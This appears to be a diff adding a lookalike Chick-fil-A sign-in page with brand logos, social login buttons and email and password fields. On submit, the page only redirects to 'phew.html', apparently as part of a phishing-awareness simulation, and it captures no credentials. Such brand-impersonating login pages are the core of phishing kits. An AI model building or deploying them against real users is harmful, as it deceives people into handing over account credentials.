@@ -1,0 +1,134 @@
+<html lang="en" dir="ltr"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Chick-fil-A - SIGN IN</title>
+
+    <link rel="stylesheet" href="assets/css/v2-bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/v2-main.css">
+    <link rel="stylesheet" href="assets/css/v2-footer.css">
+    <link rel="stylesheet" href="assets/css/v2-login.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png">
+</head>
+
+<body id="login" onlclass=" columns-layout">
+
+    <div id="header">
+        <div class="row logo-row">
+            <div id="logoContainer" class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <a href="https://www.chick-fil-a.com">
+                    <img alt="CFA icon" class="cfa-top-logo" src="assets/images/cfa-icon.svg">
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <main onload="logPageView('Sign-in DotCom');" id="content">
+        <div class="split-screen-container">
+            <div class="image-container">
+                <!-- TODO: should this image be fetched via the CDN? -->
+                <img src="assets/images/welcome-image.png" alt="Chick-fil-A Welcome" class="welcome-image">
+            </div>
+            <div class="form-container">
+                <div class="welcome-text-container">
+                    <h1>Welcome to <span class="text-nowrap">Chick-fil-A <sup></sup></span></h1>
+                    <h2>Sign in</h2>
+                </div>
+
+
+                <div class="sign-in-links-container">
+
+
+                    <div class="sign-in-item">
+                        <a class="social-button-a" id="google">
+                            <div class="social-button _btn-Google">
+                                <img src="assets/images/google-icon.svg" alt="google icon">
+                                <div>Continue with Google .</div>
+                            </div>
+                        </a>
+                    </div>
+                    <div class="sign-in-item">
+                        <a class="social-button-a" id="apple">
+                            <div class="social-button _btn-Apple">
+                                <img src="assets/images/apple-icon.svg" alt="apple icon">
+                                <div>Continue with Apple</div>
+                            </div>
+                        </a>
+                    </div>
+                    <div class="sign-in-item" style="display: none;">
+                        <a class="social-button-a" id="registration">
+                            <div class="social-button _btn-Apple">
+                                <img src="assets/images/apple-icon.svg" alt="apple icon">
+                                <div>Continue with registration</div>
+                            </div>
+                        </a>
+                    </div>
+
+                </div>
+
+
+
+                <div class="text-divider">
+                    <span>or continue via email</span>
+                </div>
+
+
+                <div class="err-container">
+                            
+                            
+                                                        </div>
+                        <form id="login-form" action="phew.html">
+                        <div class="form-group-1">
+                            <label class="textbox-label-1">Email</label>
+                            <input class="textbox-input-1" type="email" placeholder="Email">
+                        </div>
+                        <div class="form-group-1">
+                            <label class="textbox-label-1">Password</label>
+                            <input class="textbox-input-1" type="password" placeholder="Password">
+                        </div>
+                        <div class="forgot-pw-container">
+                            <button type="submit" style="
+                            background-color: #4CAF50;
+                            color: white;
+                            padding: 10px 20px;
+                            border: none;
+                            border-radius: 6px;
+                            cursor: pointer;
+                            ">Login</button>
+                        </div>
+                        </form>
+
+</form>
+
+<!-- Footer / Legal Notice -->
+<div>
+    <p class="web-login-footer">
+        <span>
+            By signing in, you acknowledge receipt of, review of, and agreement to
+            Chick-fil-A's Terms and Conditions of Use including the arbitration of certain claims,
+            as well as receipt of Chick-fil-A’s Privacy Policy and California Privacy Policy.
+        </span>
+    </p>
+</div>
+
+<!-- Footer -->
+<div id="footer" class="web-login-footer">
+    <div class="copyright-text">
+        <!-- You can add copyright info here -->
+    </div>
+</div>
+
+</div>
+</div>
+</main>
+
+<!-- Redirect Script -->
+<script>
+document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission
+    window.location.href = 'phew.html'; // Redirect to your page
+});
+</script>
+</body>
+</html>
